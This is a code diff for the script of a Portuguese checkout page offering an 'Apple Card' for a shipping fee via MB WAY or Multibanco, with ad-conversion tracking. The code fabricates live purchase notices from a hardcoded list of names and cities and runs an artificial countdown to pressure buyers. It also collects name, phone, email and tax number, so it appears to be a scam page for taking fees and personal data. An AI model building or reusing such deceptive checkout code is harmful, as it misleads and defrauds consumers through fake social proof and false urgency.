+        document.getElementById('payPrice').textContent = formatEUR(frete);
+
+        if (window.track) window.track('InitiateCheckout', {
+            value: frete,
+            currency: 'EUR',
+            num_items: 1,
+            content_id: 'apple-card-pt-' + tipo,
+            content_name: 'Apple Card — ' + (tipoLabels[tipo] || 'Expresso'),
+            content_type: 'product'
+        });
+
+        // ─── Countdown Timer (checkout) ───
+        let totalSeconds = 15 * 60;
+        function updateTimer() {
+            const m = Math.floor(totalSeconds / 60);
+            const s = totalSeconds % 60;
+            document.getElementById('timer').textContent = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+            if (totalSeconds > 0) { totalSeconds--; setTimeout(updateTimer, 1000); }
+            else { document.getElementById('timer').textContent = 'EXPIRADO'; }
+        }
+        updateTimer();
+
+        // ─── FAQ Toggle ───
+        window.toggleFaq = function(el) { el.parentElement.classList.toggle('open'); };
+
+        // ─── Social Proof Rotation ───
+        const proofs = [
+            {name:'Maria S.',city:'Lisboa'},{name:'João P.',city:'Porto'},
+            {name:'Ana C.',city:'Braga'},{name:'Carlos M.',city:'Coimbra'},
+            {name:'Fernanda L.',city:'Faro'},{name:'Pedro R.',city:'Aveiro'},
+            {name:'Juliana A.',city:'Setúbal'},{name:'Lucas D.',city:'Évora'},
+            {name:'Camila F.',city:'Funchal'},{name:'Rafael N.',city:'Leiria'}
+        ];
+        let proofIdx = 0;
+        function rotateSocialProof() {
+            const p = proofs[proofIdx % proofs.length];
+            const actions = ['concluiu o pagamento MB WAY','acabou de pedir o Apple Card','pagou com MB WAY há 2 minutos','concluiu a encomenda agora'];
+            const action = actions[Math.floor(Math.random() * actions.length)];
+            const el = document.getElementById('liveText');
+            el.style.opacity = '0';
+            setTimeout(() => {
+                el.innerHTML = `<strong>${p.name}</strong> de ${p.city} ${action}`;
+                el.style.opacity = '1';
+            }, 300);
+            proofIdx++;
+        }
+        setInterval(rotateSocialProof, 5000);
+
+        // ═══════════════════════════════════════
+        // ─── PAYMENT LOGIC ───
+        // ═══════════════════════════════════════
+
+        let currentTransactionId = null;
+        let currentMethod = 'mbway';
+        let statusCheckInterval = null;
+        let mbTimerInterval = null;
+        let mbTimerSeconds = 30 * 60;
+
+        window.selectMethod = function(method) {
+            currentMethod = method === 'mbway' ? 'mbway' : 'multibanco';
+            document.querySelectorAll('.mb-method').forEach(el => {
+                el.classList.toggle('selected', el.getAttribute('data-method') === currentMethod);
+            });
+            const isMbway = currentMethod === 'mbway';
+            document.getElementById('payLabel').textContent = isMbway ? 'Pagar com MB WAY' : 'Pagar com Multibanco';
+            document.getElementById('payBadge').src = isMbway ? 'assets/images/mbway.jpg' : 'assets/images/multibanco.png';
+            document.getElementById('payBtn').style.background = '';
+        };
+
+        // ─── Erro de pagamento inline (substitui alert) ───
+        function normalizePhoneDigits(raw) {
+            return String(raw || '').replace(/\D+/g, '').replace(/^351/, '');
+        }
+
+        window.showPayError = function(msg, allowPhoneEdit) {
+            document.getElementById('payErrorMsg').textContent = msg;
+            const wrap = document.getElementById('payErrorPhoneWrap');
+            const retry = document.getElementById('payErrorRetry');
+            if (allowPhoneEdit) {
+                wrap.style.display = '';
+                const inp = document.getElementById('payErrorPhone');
+                const cur = normalizePhoneDigits(data.telefone || data.phone);
+                if (cur && !inp.value) inp.value = cur;
+                retry.textContent = 'Confirmar e tentar novamente';
+                setTimeout(function() { inp.focus(); }, 250);
+            } else {
+                wrap.style.display = 'none';
+                retry.textContent = 'Tentar novamente';
+            }
+            const box = document.getElementById('payError');
+            box.style.display = '';
+            box.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        };
+
+        window.hidePayError = function() {
+            document.getElementById('payError').style.display = 'none';
+        };
+
+        window.retryPayment = function() {
+            const wrap = document.getElementById('payErrorPhoneWrap');
+            if (wrap.style.display !== 'none') {
+                const digits = normalizePhoneDigits(document.getElementById('payErrorPhone').value);
+                if (digits.length !== 9) {
+                    showPayError('Introduza um número de telemóvel português válido (9 dígitos).', true);
+                    return;
+                }
+                data.telefone = digits;
+                data.phone = digits;
+                if (window.LeadData && LeadData.update) LeadData.update({ telefone: digits, phone: digits });
+            }
+            hidePayError();
+            generatePayment();
+        };
+
+        window.generatePayment = async function() {
+            const btn = document.getElementById('payBtn');
+
+            // Validação client-side: evita ida ao gateway com número inválido.
+            if (normalizePhoneDigits(data.telefone || data.phone).length !== 9) {
+                showPayError('O seu número de telemóvel parece incompleto. Confirme abaixo para continuar.', true);
+                return;
+            }
+            hidePayError();
+
+            btn.classList.add('loading');
+            btn.disabled = true;
+
+            if (window.track) window.track('AddPaymentInfo', {
+                value: frete,
+                currency: 'EUR',
+                payment_method: currentMethod,
+                content_id: 'apple-card-pt-' + tipo,
+                content_type: 'product'
+            });
+
+            // utm: query string completa da página (utm_*, fbclid, etc.) mesclada com o que estiver guardado.
+            const currentQs = window.location.search.replace(/^\?/, '');
+            const mergedQs = new URLSearchParams(currentQs);
+            utmKeys.forEach(k => {
+                if (!mergedQs.has(k)) {
+                    const v = localStorage.getItem(k);
+                    if (v) mergedQs.set(k, v);
+                }
+            });
+            const utm = mergedQs.toString();
+
+            // gclid robusto p/ roteamento de conta: URL atual OU o persistido no
+            // 1º toque (tt_gclid, gravado pelo tracker) — não depende da URL do checkout.
+            const gclid = new URLSearchParams(window.location.search).get('gclid')
+                       || localStorage.getItem('tt_gclid') || '';
+
+            const abGroup = new URLSearchParams(window.location.search).get('ab') || data.ab_frete_grupo || '';
+
+            const payload = {
+                amount: amountCents,
+                method: currentMethod,
+                payerName: data.nome || data.name || params.get('nome') || 'Cliente',
+                email: data.email || params.get('email') || '',
+                phone: data.telefone || data.phone || params.get('phone') || '',
+                document: data.nif || data.document || params.get('nif') || '',
+                productName: `Apple Card - Envio ${tipoLabels[tipo] || 'Expresso'}`,
+                utm: utm,
+                gclid: gclid,
+                abGroup: abGroup
+            };
+
+            try {
+                const res = await fetch('api/stripe-transaction', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const result = await res.json();
+
+                if (result.success) {
+                    currentTransactionId = result.transactionId;
+                    const isMbway = result.method === 'mbway';
+
+                    LeadData.update({
+                        transaction_id: result.transactionId,
+                        payment_method: result.method,
+                        payment_entity: result.entity || '',
+                        payment_reference: result.reference || '',
+                        mb_generated: true,
+                        mb_timestamp: Date.now()
+                    });
+
+                    document.getElementById('modalTitle').textContent = isMbway ? 'Pagamento MB WAY' : 'Pagamento Multibanco';
+                    document.getElementById('blockMultibanco').style.display = isMbway ? 'none' : '';
+                    document.getElementById('blockMbway').style.display = isMbway ? '' : 'none';
+                    document.getElementById('stepsMultibanco').style.display = isMbway ? 'none' : '';
+                    document.getElementById('stepsMbway').style.display = isMbway ? '' : 'none';
+
+                    if (isMbway) {
+                        const phoneStr = result.phone || payload.phone || '';
+                        const phoneFmt = phoneStr.replace(/^\+351/, '').replace(/(\d{3})(\d{3})(\d{3})/, '$1 $2 $3');
+                        document.getElementById('mbwayPhone').textContent = phoneFmt || '—';
+                        document.getElementById('mbwayAmount').textContent = formatEUR(result.amount || frete);
+                        document.getElementById('mbTimerLabel').textContent = 'Aguarde a confirmação no app';
+                        document.getElementById('mbStatusDesc').textContent = 'Abra a notificação no seu telemóvel e confirme';
+                    } else {
+                        document.getElementById('mbEntity').value = result.entity || '—';
+                        document.getElementById('mbReference').value = result.reference || '—';
+                        document.getElementById('mbAmount').textContent = formatEUR(result.amount || frete);
+                        document.getElementById('mbTimerLabel').textContent = 'A referência expira em';
+                        document.getElementById('mbStatusDesc').textContent = 'Use a entidade e a referência abaixo';
+                    }
+
+                    openMbModal();
+                    startStatusCheck();
+                    startMbTimer();
+
+                } else {
+                    const msg = result.error || 'Não foi possível gerar o pagamento. Tente novamente.';
+                    // Se o erro for relativo ao número, abre o campo para correção.
+                    const phoneIssue = /telem|telefone|phone|n[uú]mero/i.test(msg);
+                    showPayError(msg, phoneIssue);
+                }
+            } catch (err) {
+                console.error('Erro:', err);
+                showPayError('Falha de ligação ao gerar o pagamento. Verifique a sua internet e tente novamente.', false);
+            } finally {
+                btn.classList.remove('loading');
+                btn.disabled = false;
+            }
+        };
+
+        function openMbModal() {
+            document.getElementById('mbOverlay').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        window.closeMbModal = function() {
+            document.getElementById('mbOverlay').classList.remove('active');
+            document.body.style.overflow = '';
+        };
+
+        document.getElementById('mbOverlay').addEventListener('click', function(e) {
+            if (e.target === this) closeMbModal();
+        });
+
+        // ─── Copy field (entidade/referência) ───
+        window.copyField = function(btn) {
+            const targetId = btn.getAttribute('data-target');
+            const input = document.getElementById(targetId);
+            if (!input || !input.value || input.value === '—') return;
+
+            const value = input.value;
+            const done = () => {
+                btn.textContent = '✓ Copiado';
+                btn.classList.add('copied');
+                setTimeout(() => { btn.textContent = 'Copiar'; btn.classList.remove('copied'); }, 3000);
+            };
+
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(value).then(done).catch(() => fallback(input, done));
+            } else {
+                fallback(input, done);
+            }
+        };
+
+        function fallback(input, done) {
+            input.select();
+            input.setSelectionRange(0, 99999);
+            document.execCommand('copy');
+            done();
+        }
+
+        // ─── MB Timer ───
+        function startMbTimer() {
+            mbTimerSeconds = 30 * 60;
+            if (mbTimerInterval) clearInterval(mbTimerInterval);
+            mbTimerInterval = setInterval(updateMbTimer, 1000);
+            updateMbTimer();
+        }
+
+        function updateMbTimer() {
+            const m = Math.floor(mbTimerSeconds / 60);
+            const s = mbTimerSeconds % 60;
+            document.getElementById('mbTimer').textContent = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+            if (mbTimerSeconds > 0) {
+                mbTimerSeconds--;
+            } else {
+                document.getElementById('mbTimer').textContent = 'EXPIRADO';
+                if (mbTimerInterval) clearInterval(mbTimerInterval);
+                stopStatusCheck();
+            }
+        }
+
+        // ─── Status Check (Polling) ───
+        function startStatusCheck() {
+            if (statusCheckInterval) clearInterval(statusCheckInterval);
+            statusCheckInterval = setInterval(checkPaymentStatus, 5000);
+            setTimeout(checkPaymentStatus, 4000);
+        }
+
+        function stopStatusCheck() {
+            if (statusCheckInterval) {
+                clearInterval(statusCheckInterval);
+                statusCheckInterval = null;
+            }
+        }
+
+        async function checkPaymentStatus() {
+            if (!currentTransactionId) return;
+
+            try {
+                const res = await fetch(`api/stripe-status?id=${encodeURIComponent(currentTransactionId)}`);
+                const result = await res.json();
+
+                if (result.status === 'APPROVED') {
+                    stopStatusCheck();
+                    if (mbTimerInterval) clearInterval(mbTimerInterval);
+                    showPaymentApproved();
+                }
+            } catch (err) {
+                console.error('Erro ao verificar estado:', err);
+            }
+        }
+
+        function showPaymentApproved() {
+            // Purchase event — usa transactionId como event_id pra deduplicar
+            // com o evento server-side disparado por /api/stripe-status.
+            try {
+                if (window.ttq && currentTransactionId) {
+                    window.ttq.track('Purchase', {
+                        value: frete,
+                        currency: 'EUR',
+                        content_type: 'product',
+                        content_id: 'apple-card-pt-' + tipo,
+                        content_name: 'Apple Card — ' + (tipoLabels[tipo] || 'Expresso'),
+                        transaction_id: currentTransactionId,
+                        event_id: 'purchase_' + currentTransactionId
+                    }, { event_id: 'purchase_' + currentTransactionId });
+                }
+            } catch (e) {}
+
+            // Google Ads — conversão de Compra (mesmo transaction_id p/ dedup).
+            try { if (window.googleAdsPurchase && currentTransactionId) window.googleAdsPurchase(frete, currentTransactionId); } catch (e) {}
+
+            const statusIcon = document.getElementById('mbStatusIcon');
+            statusIcon.className = 'ps-icon paid';
+            statusIcon.innerHTML = '<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>';
+
+            const statusDot = document.getElementById('mbStatusDot');
+            statusDot.className = 'mb-status-dot paid';
+
+            document.getElementById('mbStatusText').textContent = 'Pagamento confirmado!';
+            document.getElementById('mbStatusDesc').textContent = 'O seu Apple Card está a ser preparado';
+            document.getElementById('mbStatus').style.background = 'rgba(52,199,89,0.08)';
+
+            LeadData.update({
+                payment_confirmed: true,
+                payment_timestamp: Date.now()
+            });
+
+            setTimeout(() => {
+                window.location.href = buildUrl('obrigado.html');
+            }, 2500);
+        }
+
+        function buildUrl(base, extra = {}) {
+            const u = new URL(base, window.location.href);
+            new URLSearchParams(window.location.search).forEach((v, k) => u.searchParams.set(k, v));
+            Object.entries(extra).forEach(([k, v]) => { if (v) u.searchParams.set(k, v); });
+            return u.toString();
+        }
+
+        // ─── Skip directo para teste ───
+        const skipParam = params.get('skip');
+        if (skipParam === 'pago') {
+            LeadData.update({ payment_confirmed: true, payment_timestamp: Date.now() });
+            window.location.href = buildUrl('obrigado.html');
+        }
+
+    })();
+    </script>
+</body>
+</html>
